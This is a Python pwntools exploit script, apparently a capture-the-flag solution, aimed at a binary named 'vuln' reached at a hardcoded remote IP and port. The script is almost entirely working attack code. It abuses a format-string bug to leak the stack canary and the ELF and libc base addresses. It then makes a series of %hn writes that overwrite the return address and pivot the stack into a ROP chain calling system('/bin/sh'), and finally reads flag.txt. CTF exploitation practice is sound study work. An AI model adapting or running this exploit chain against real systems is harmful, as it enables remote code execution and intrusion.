#!/usr/bin/env python3
import sys
from pwn import *

elf = ELF("./vuln")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")
ROP_LOAD = ROP("./libc.so.6")
context.update(binary=elf, log_level="DEBUG")

if args.LOCAL:
    p = elf.process()
elif args.GDB:
    p = gdb.debug([elf.path], '''
           breakrva 0x0000000000001E63
        ''')
        #        breakrva 0x0000000000001F78
        #    breakrva 0x0000000000001F87
        #    breakrva 0x0000000000001F96
        #    breakrva 0x0000000000002032
        # fn_loginAdmin_1659();
        # fn_createUser_1848();
        # fn_loginUser_1B0B();
        # fn_viewDescription_1D00();

        # fn_viewDescription_1D00(); printf
else:
    p = remote("34.66.114.153", "31638")

def loginAdmin():
    p.sendlineafter(b"choice: ", b"1")
    p.sendlineafter(b"here?\n", b"manage users" + b"\x00" * 3 + b"A" * 5)
    p.sendlineafter(b"username: ", b"MrAlphaQ")
    p.sendlineafter(b"password: ", b"A" * 4)
    return

def createUser(username, passwd, des):
    p.sendlineafter(b"choice: ", b"2")
    p.sendlineafter(b"username: ", username)
    p.sendlineafter(b"password: ", passwd)
    p.sendlineafter(b"description: ", des)
    return

def loginUser(username, passwd):
    p.sendlineafter(b"choice: ", b"3")
    p.sendlineafter(b"username: ", username)
    p.sendlineafter(b"password: ", passwd)
    return

def logout():
    p.sendlineafter(b"choice: ", b"4")
    return 

def viewDescription():
    p.sendlineafter(b"choice: ", b"5")
    return

# 000000000000533C
loginAdmin()
user1 = b"user1"
passwd1 = b"passwd1"
des1 = b"%p-"*0x35
createUser(user1, passwd1, des1)
logout()

loginUser(user1, passwd1)
viewDescription()
p.recvuntil(b"is: ")
leak = p.recvline().strip().split(b"-")
ret_main = int(leak[-9], 16) + 8
elf.address = int(leak[-2], 16) - 0x1eea
libc.address = int(leak[-4], 16) - 0x29d90
canary = int(leak[-10], 16)
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh'))
exit_ = libc.symbols['exit']
log.info("stack Main return address     : " + hex(ret_main))
log.info("ELF base address              : " + hex(elf.address))
log.info("Canary value                  : " + hex(canary))
log.info("LIBC base address             : " + hex(libc.address))
log.info("Libc system func address      : " + hex(system))
log.info("Libc string '/bin/sh' address : " + hex(binsh))
log.info("Libc exit func address        : " + hex(exit_))
cnt_user_address =  elf.address + 0x000000000000533C
log.info("cnt_user_address              : " + hex(cnt_user_address))
logout()

loginAdmin()
user2 = b"user2"
passwd2 = b"passwd2"
des2 = b"%p" * 8 + b"%hn" + b"-----" + p64(cnt_user_address - 1)
createUser(user2, passwd2, des2)
logout()

def set_zero_cnt():
    loginUser(user2, passwd2)
    viewDescription()
    logout()
    return  

# pop_rdi_ret = libc.address + (ROP_LOAD.find_gadget(['pop rdi', 'ret']))[0]
# pop_rsp_ret = libc.address + (ROP_LOAD.find_gadget(['pop rsp', 'ret']))[0]
pop_rdi_ret = libc.address + 0x000000000002a3e5
pop_rsp_ret = libc.address + 0x0000000000035732
ret = pop_rdi_ret + 1
log.info("pop rdi; ret address          : " + hex(pop_rdi_ret))
log.info("pop rsp; ret address          : " + hex(pop_rsp_ret))

log.info("1")
set_zero_cnt()
loginAdmin()
user1 = b"user1"
passwd1 = b"passwd1"
wr = int(hex(pop_rsp_ret)[-4:], 16)
lenn = 8 + 8 - (len(str(wr)) + 2)
des1 = b"%c" * 8 
des1 += f"%{wr - lenn}c".encode()
des1 = des1.ljust(24, b"-") 
des1 += b"%hn" + b"-----" + p64(ret_main)
createUser(user1, passwd1, des1)
logout()
loginUser(user1, passwd1)
viewDescription()
logout()

log.info("2")
set_zero_cnt()
loginAdmin()
user1 = b"user1"
passwd1 = b"passwd1"
wr = int(hex(pop_rsp_ret)[-6:-4], 16)
lenn = 8 + 8 - (len(str(wr)) + 2)
des1 = b"%c" * 8 
des1 += f"%{wr - lenn}c".encode()
des1 = des1.ljust(24, b"-") 
des1 += b"%hhn" + b"----" + p64(ret_main + 2)
createUser(user1, passwd1, des1)
logout()
loginUser(user1, passwd1)
viewDescription()
logout()

fake_rsp2 = ret_main - 0x148 # 0x108
fake_rsp = elf.address + 0x5060 + 0x64 + 8
log.info("fake_rsp                      : " + hex(fake_rsp))

log.info("3")
set_zero_cnt()
loginAdmin()
user1 = b"user1"
passwd1 = b"passwd1"
wr = int(hex(fake_rsp)[-4:], 16)
lenn = 8 + 8 - (len(str(wr)) + 2)
des1 = b"%c" * 8 
des1 += f"%{wr - lenn}c".encode()
des1 = des1.ljust(24, b"-") 
des1 += b"%hn" + b"-----" + p64(ret_main + 8)
createUser(user1, passwd1, des1)
logout()
loginUser(user1, passwd1)
viewDescription()
logout()

log.info("4")
set_zero_cnt()
loginAdmin()
user1 = b"user1"
passwd1 = b"passwd1"
wr = int(hex(fake_rsp)[-8:-4], 16)
lenn = 8 + 8 - (len(str(wr)) + 2)
des1 = b"%c" * 8 
des1 += f"%{wr - lenn}c".encode()
des1 = des1.ljust(24, b"-") 
des1 += b"%hn" + b"-----" + p64(ret_main + 10)
createUser(user1, passwd1, des1)
logout()
loginUser(user1, passwd1)
viewDescription()
logout()

log.info("5")
set_zero_cnt()
loginAdmin()
user1 = b"user1"
passwd1 = b"passwd1"
wr = int(hex(fake_rsp)[-12:-8], 16)
lenn = 8 + 8 - (len(str(wr)) + 2) + 1
des1 = b"%c" * 8 
des1 += f"%{wr - lenn}c".encode()
des1 = des1.ljust(24, b"-") 
des1 += b"%c%hn" + b"---" 
des1 += p64(system) + p64(ret_main + 12)
des1 += p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(pop_rsp_ret) + p64(fake_rsp2)
createUser(user1, passwd1, des1)
logout()
loginUser(user1, passwd1)
viewDescription()
# rbp-140h
p.sendlineafter(b"choice: ", b"6")

sleep(0.5)
p.sendline(b'cat flag.txt')
data = p.recvuntil(b'}')
print(data)
p.close()

# p.interactive()